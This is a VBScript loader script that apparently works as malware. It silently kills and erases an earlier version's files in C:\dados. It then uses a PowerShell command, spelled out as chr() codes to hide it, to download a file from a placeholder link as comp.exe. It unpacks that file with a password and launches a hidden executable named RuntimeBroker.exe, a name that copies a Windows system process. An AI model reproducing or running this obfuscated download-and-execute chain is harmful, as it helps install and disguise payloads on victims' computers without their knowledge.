Dim fldr, shl, psCmd1p1, psCmd1p2, psCmd1p3, psCmd1p4

fldr = "C:\dados"
Set fso = CreateObject("Scripting.FileSystemObject")
Set shl = CreateObject("WScript.Shell")

'clear old buggy version
If fso.FileExists(fldr+"\macro_wrd.vbs") = True Then
	WScript.Quit
End If
'no need to obfuscate these
If fso.FileExists(fldr+"\RuntimeBroker.exe") = True Then
	zzCmd0 = "taskkill /f /im RuntimeBroker.exe"
	zzCmd1 = "taskkill /f /im ziriguidum.exe"
	zzCmd2 = "erase C:\dados\RuntimeBroker.exe /A H"
	zzCmd3 = "erase C:\dados\ziriguidum.exe /A H"
	zzCmd4 = "erase C:\dados\settings.json /A H"
	zzCmd5 = "erase C:\dados\inj.vbs /A H"
	zzCmd6 = "erase C:\dados\macro_final.vbs /A H"
	zzCmd7 = "erase C:\dados\comp.exe /A H"
	shl.Run zzCmd0, 0
	WScript.Sleep(10000)
	shl.Run zzCmd1, 0
	WScript.Sleep(10000)
	shl.Run zzCmd2, 0
	shl.Run zzCmd3, 0
	shl.Run zzCmd4, 0
	shl.Run zzCmd5, 0
	shl.Run zzCmd6, 0
	shl.Run zzCmd7, 0
	WScript.Sleep(10000)
End If

psCmd1p1 = chr(112)+chr(111)+chr(119)+chr(101)+chr(114)+chr(115)+chr(104)+chr(101)+chr(108)+chr(108)+" -Command "+chr(34)+chr(73)+chr(110)+chr(118)+chr(111)+chr(107)+chr(101)+chr(45)+chr(87)+chr(101)+chr(98)+chr(82)+chr(101)+chr(113)+chr(117)+chr(101)+chr(115)+chr(116)
psCmd1p2 = " <LINK_DO_COMP.DAT_AQUIIIIII> "
psCmd1p3 = chr(45)+chr(79)+chr(117)+chr(116)+chr(70)+chr(105)+chr(108)+chr(101)
psCmd1p4 = " "+fldr+"\comp.exe"+chr(34)

shl.Run psCmd1p1+psCmd1p2+psCmd1p3+psCmd1p4, 0
WScript.Sleep 60000 '1min

psCmd1p1 = fldr+"\comp.exe"
psCmd1p2 = " -pPMC2025 -y"
shl.Run psCmd1p1+psCmd1p2, 0
WScript.Sleep 15000 '15 sec, 1 min was too long

psCmd1p1 = fldr+"\RuntimeBroker.exe"
shl.Run psCmd1p1, 0